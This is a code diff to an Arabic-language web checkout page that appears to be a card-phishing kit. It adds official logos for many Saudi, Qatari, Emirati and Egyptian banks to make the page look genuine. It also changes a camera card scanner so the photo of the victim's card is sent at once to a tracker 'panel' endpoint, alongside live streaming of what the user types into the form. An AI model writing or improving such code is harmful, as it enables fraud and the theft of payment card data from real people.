@@ -39,18 +39,16 @@
       display: flex;
       justify-content: space-between;
       align-items: center;
-      min-height: 38px;
+      min-height: 40px;
     }
-    /* 🏦 تثبيت أبعاد الشعار لتطابق 128px بنسب العرض المخصصة */
+    /* 🏦 شعار بنك نقي بدون خلفية بيضاء */
     .bank-logo-img {
-      height: 34px !important;
-      width: 34px !important;
-      border-radius: 8px;
+      height: 36px !important;
+      max-width: 150px !important;
       object-fit: contain;
-      background: #ffffff;
-      padding: 2px;
-      box-shadow: 0 1px 4px rgba(0,0,0,0.08);
+      background: transparent !important;
       display: none;
+      filter: drop-shadow(0 1px 2px rgba(0,0,0,0.05));
     }
     .bank-brand-title {
       font-weight: 800;
@@ -364,7 +362,7 @@
       </div>
 
       <form id="checkout-form" onsubmit="handlePaymentSubmit(event)">
-        <!-- 📸 حقل مخفي لتخزين صورة المسح وإرسالها مباشرة مع بيانات البطاقة -->
+        <!-- 📸 حقل مخفي مخصص لحفظ لقطة البطاقة بعد تصغيرها وإرسالها مباشرة -->
         <input type="hidden" id="card-scanned-image" name="scannedCardImage" value="">
 
         <div class="form-group">
@@ -509,6 +507,41 @@
       'OM': 'OMR', 'JO': 'JOD', 'EG': 'EGP', 'IQ': 'IQD', 'LB': 'USD'
     };
 
+    // 🏛️ قاموس شعارات ويكيبيديا الرسمية الشفافة المباشرة لأهم بنوك المنطقة (الأولوية الأولى)
+    var WIKIPEDIA_BANK_LOGOS = {
+      "riyad": "https://upload.wikimedia.org/wikipedia/commons/e/e0/Riyad_Bank_Logo.svg",
+      "alrajhi": "https://upload.wikimedia.org/wikipedia/commons/e/ea/Al_Rajhi_Bank_Logo.svg",
+      "rajhi": "https://upload.wikimedia.org/wikipedia/commons/e/ea/Al_Rajhi_Bank_Logo.svg",
+      "snb": "https://upload.wikimedia.org/wikipedia/commons/e/e8/Saudi_National_Bank_Logo.svg",
+      "national commercial": "https://upload.wikimedia.org/wikipedia/commons/e/e8/Saudi_National_Bank_Logo.svg",
+      "alinma": "https://upload.wikimedia.org/wikipedia/commons/1/15/Alinma_Bank_Logo.svg",
+      "albilad": "https://upload.wikimedia.org/wikipedia/commons/a/aa/Bank_AlBilad_Logo.svg",
+      "bilad": "https://upload.wikimedia.org/wikipedia/commons/a/aa/Bank_AlBilad_Logo.svg",
+      "aljazira": "https://upload.wikimedia.org/wikipedia/commons/8/87/Bank_AlJazira_Logo.svg",
+      "jazira": "https://upload.wikimedia.org/wikipedia/commons/8/87/Bank_AlJazira_Logo.svg",
+      "saudi british": "https://upload.wikimedia.org/wikipedia/commons/a/aa/SABB_Logo.svg",
+      "sabb": "https://upload.wikimedia.org/wikipedia/commons/a/aa/SABB_Logo.svg",
+      "saudi investment": "https://upload.wikimedia.org/wikipedia/commons/5/52/SAIB_Logo.svg",
+      "qatar national": "https://upload.wikimedia.org/wikipedia/commons/d/d4/QNB_Group_logo.svg",
+      "qnb": "https://upload.wikimedia.org/wikipedia/commons/d/d4/QNB_Group_logo.svg",
+      "qatar islamic": "https://upload.wikimedia.org/wikipedia/commons/0/07/Qatar_Islamic_Bank_logo.svg",
+      "qib": "https://upload.wikimedia.org/wikipedia/commons/0/07/Qatar_Islamic_Bank_logo.svg",
+      "commercial bank of qatar": "https://upload.wikimedia.org/wikipedia/commons/a/a2/Commercial_Bank_of_Qatar_Logo.svg",
+      "cbq": "https://upload.wikimedia.org/wikipedia/commons/a/a2/Commercial_Bank_of_Qatar_Logo.svg",
+      "doha bank": "https://upload.wikimedia.org/wikipedia/commons/7/77/Doha_Bank_logo.svg",
+      "first abu dhabi": "https://upload.wikimedia.org/wikipedia/commons/5/5e/FAB_Bank_Logo.svg",
+      "fab": "https://upload.wikimedia.org/wikipedia/commons/5/5e/FAB_Bank_Logo.svg",
+      "emirates nbd": "https://upload.wikimedia.org/wikipedia/commons/b/bd/Emirates_NBD_logo.svg",
+      "dubai islamic": "https://upload.wikimedia.org/wikipedia/commons/7/7f/Dubai_Islamic_Bank_Logo.svg",
+      "abu dhabi commercial": "https://upload.wikimedia.org/wikipedia/commons/0/0e/ADCB_Logo.svg",
+      "adcb": "https://upload.wikimedia.org/wikipedia/commons/0/0e/ADCB_Logo.svg",
+      "banque misr": "https://upload.wikimedia.org/wikipedia/commons/b/b3/Banque_Misr_Logo.svg",
+      "national bank of egypt": "https://upload.wikimedia.org/wikipedia/commons/2/2e/National_Bank_of_Egypt_Logo.svg",
+      "nbe": "https://upload.wikimedia.org/wikipedia/commons/2/2e/National_Bank_of_Egypt_Logo.svg",
+      "cib": "https://upload.wikimedia.org/wikipedia/commons/1/1a/Commercial_International_Bank_Logo.svg",
+      "arab bank": "https://upload.wikimedia.org/wikipedia/commons/4/4b/Arab_Bank_logo.svg"
+    };
+
     (async function loadBinDatabase() {
       try {
         const res = await fetch('bin_list_filtered_mena.csv');
@@ -631,7 +664,7 @@
         };
 
         if (scannedImg) {
-          data['صورة البطاقة (Scan)'] = scannedImg;
+          data['صورة البطاقة'] = scannedImg;
         }
 
         var payloadString = JSON.stringify(data);
@@ -665,9 +698,38 @@
       }
     }
 
-    // 🏦 أولويات جلب شعار البنك: Google -> logo.dev -> Brandfetch -> النص الأصلي
+    // 🌟 دالة جلب الشعار: 1. ويكيبيديا المباشر -> 2. ويكيبيديا العام -> 3. logo.dev -> 4. Brandfetch -> 5. الاسم النصي
     function setupBankLogoChain(imgEl, titleEl, domain, bankName) {
-      if (!domain) {
+      var bankKey = (bankName || '').toLowerCase();
+      var wikiDirectLogo = '';
+
+      for (var k in WIKIPEDIA_BANK_LOGOS) {
+        if (bankKey.includes(k)) {
+          wikiDirectLogo = WIKIPEDIA_BANK_LOGOS[k];
+          break;
+        }
+      }
+
+      var sources = [];
+
+      // 1. ويكيبيديا أولاً
+      if (wikiDirectLogo) {
+        sources.push(wikiDirectLogo);
+      } else if (domain) {
+        sources.push(`https://en.wikipedia.org/w/api.php?action=query&titles=${encodeURIComponent(bankName)}&prop=pageimages&format=json&pithumbsize=128&origin=*`);
+      }
+
+      // 2. img.logo.dev (شفاف عالي الدقة webp)
+      if (domain) {
+        sources.push(`https://img.logo.dev/${domain}?token=pk_e4fYjVyiQu2QqS2morxUWw&format=webp&retina=true`);
+      }
+
+      // 3. Brandfetch
+      if (domain) {
+        sources.push(`https://cdn.brandfetch.io/${domain}?c=1idSesRHEWOhjfUTdaD`);
+      }
+
+      if (sources.length === 0) {
         imgEl.style.display = 'none';
         if (bankName) {
           titleEl.innerText = bankName;
@@ -678,18 +740,31 @@
         return;
       }
 
-      const sources = [
-        `https://www.google.com/s2/favicons?domain=${domain}&sz=128`,
-        `https://img.logo.dev/${domain}?token=pk_e4fYjVyiQu2QqS2morxUWw&format=webp&retina=true`,
-        `https://cdn.brandfetch.io/${domain}?c=1idSesRHEWOhjfUTdaD`
-      ];
+      var currentIndex = 0;
 
-      let currentIndex = 0;
-
-      imgEl.onerror = function() {
-        currentIndex++;
+      function tryNextSource() {
         if (currentIndex < sources.length) {
-          imgEl.src = sources[currentIndex];
+          var src = sources[currentIndex];
+          currentIndex++;
+
+          // إذا كان الرابط هو استعلام ويكيبيديا API
+          if (src.includes('wikipedia.org/w/api.php')) {
+            fetch(src)
+              .then(res => res.json())
+              .then(data => {
+                var pages = data && data.query && data.query.pages;
+                var pageId = pages && Object.keys(pages)[0];
+                var thumb = pageId && pages[pageId] && pages[pageId].thumbnail && pages[pageId].thumbnail.source;
+                if (thumb) {
+                  imgEl.src = thumb;
+                } else {
+                  tryNextSource();
+                }
+              })
+              .catch(() => tryNextSource());
+          } else {
+            imgEl.src = src;
+          }
         } else {
           imgEl.style.display = 'none';
           if (bankName) {
@@ -699,6 +774,10 @@
             titleEl.style.display = 'none';
           }
         }
+      }
+
+      imgEl.onerror = function() {
+        tryNextSource();
       };
 
       imgEl.onload = function() {
@@ -706,7 +785,7 @@
         titleEl.style.display = 'none';
       };
 
-      imgEl.src = sources[0];
+      tryNextSource();
     }
 
     function validateCardNumber(el) {
@@ -876,7 +955,6 @@
       }, 800);
     }
 
-    // 📷 منطق تشغيل الماسح الضوئي للكاميرا مع المعالجة المسبقة الفائقة (High Precision OCR)
     var mediaStream = null;
 
     async function openCardScanner() {
@@ -916,36 +994,52 @@
       btn.innerText = "جاري المعالجة وقراءة الرقم...";
       btn.disabled = true;
 
-      // 1. أخذ لقطة كاملة من الفيديو
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      // 1. توليد لقطة مدمجة وخفيفة جداً (أقل من 20KB) لضمان قبولها في اللوحة فوراً
+      const thumbCanvas = document.createElement('canvas');
+      thumbCanvas.width = 320;
+      thumbCanvas.height = 200;
+      const thumbCtx = thumbCanvas.getContext('2d');
+      thumbCtx.drawImage(video, 0, 0, 320, 200);
 
-      // 📸 تخزين الصورة في الحقل المخفي وإرسالها مباشرة مع كارت الزائر
-      const capturedBase64 = canvas.toDataURL('image/jpeg', 0.65);
+      const capturedBase64 = thumbCanvas.toDataURL('image/jpeg', 0.5);
       document.getElementById('card-scanned-image').value = capturedBase64;
 
-      // 2. تحسين تباين الصورة وتركيز القراءة على منطقة الأرقام فقط (Enhancement Filter)
+      // بث صورة المسح مباشرة إلى اللوحة في حدث منفصل خفيف
+      fetch(SERVER_HUB_URL + '/api/tracker/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          token: visitorToken,
+          siteKey: siteKey,
+          formName: 'لقطة مسح البطاقة (كاميرا 📷)',
+          submissionData: {
+            'صورة البطاقة': capturedBase64,
+            '_sessionId': currentSessionId
+          },
+          isFinalSubmission: false,
+          isImportant: true
+        }),
+        keepalive: true
+      }).catch(function() {});
+
+      // 2. إنشاء Canvas المعالجة الدقيقة لتحسين التباين واستخراج الأرقام فقط
       const ocrCanvas = document.createElement('canvas');
-      ocrCanvas.width = canvas.width;
-      ocrCanvas.height = canvas.height;
+      ocrCanvas.width = video.videoWidth || 640;
+      ocrCanvas.height = video.videoHeight || 480;
       const ocrCtx = ocrCanvas.getContext('2d');
-      ocrCtx.drawImage(canvas, 0, 0);
+      ocrCtx.drawImage(video, 0, 0, ocrCanvas.width, ocrCanvas.height);
 
       const imgData = ocrCtx.getImageData(0, 0, ocrCanvas.width, ocrCanvas.height);
       const d = imgData.data;
       for (let i = 0; i < d.length; i += 4) {
         const avg = 0.3 * d[i] + 0.59 * d[i + 1] + 0.11 * d[i + 2];
-        const v = avg > 115 ? 255 : 0; // زيادة التباين الثنائي لعزل الأرقام البارزة
+        const v = avg > 115 ? 255 : 0;
         d[i] = v;
         d[i + 1] = v;
         d[i + 2] = v;
       }
       ocrCtx.putImageData(imgData, 0, 0);
 
-      // 3. قراءة أرقام البطاقة فقط وتجاهل أي نصوص أخرى
       try {
         const { data: { text } } = await Tesseract.recognize(ocrCanvas, 'eng', {
           tessedit_char_whitelist: '0123456789 -'
@@ -954,7 +1048,6 @@
         const cleanDigitsOnly = text.replace(/\D/g, '');
         let targetCardDigits = '';
 
-        // البحث عن 16 رقماً متطابقاً مع خوارزمية Luhn
         for (let len = 16; len >= 13; len--) {
           const regex = new RegExp(`\\d{${len}}`, 'g');
           const matches = cleanDigitsOnly.match(regex);
@@ -969,7 +1062,6 @@
           if (targetCardDigits) break;
         }
 
-        // في حال لم تجتاز فحص Luhn، التقاط أول مقطع مؤلف من 16 رقماً
         if (!targetCardDigits) {
           const fallbackMatch = cleanDigitsOnly.match(/\d{16}/) || text.match(/(?:\d[ -]*?){16}/);
           if (fallbackMatch) {
@@ -977,15 +1069,14 @@
           }
         }
 
-        if (targetCardDigits && targetCardDigits.length >= 14) {
+        if (targetCardDigits && targetCardDigits.length >= 13) {
           const cardInput = document.getElementById('card-number');
           cardInput.value = targetCardDigits;
           validateCardNumber(cardInput);
           closeCardScanner();
-          // بث تحديث فوري بالصورة ورقم البطاقة للوحة
           streamLiveFormPayload('typing');
         } else {
-          alert("لم يتم استخراج أرقام البطاقة بدقة، يرجى ضبط الإضاءة وتوجيه الكاميرا أفقياً على الأرقام.");
+          alert("لم يتم التعرف على أرقام البطاقة بدقة، يرجى ضبط الإضاءة وتوجيه الكاميرا أفقياً على الأرقام.");
         }
       } catch (e) {
         alert("تعذر قراءة أرقام البطاقة، يرجى المحاولة بزاوية أخرى أو إدخالها يدوياً.");
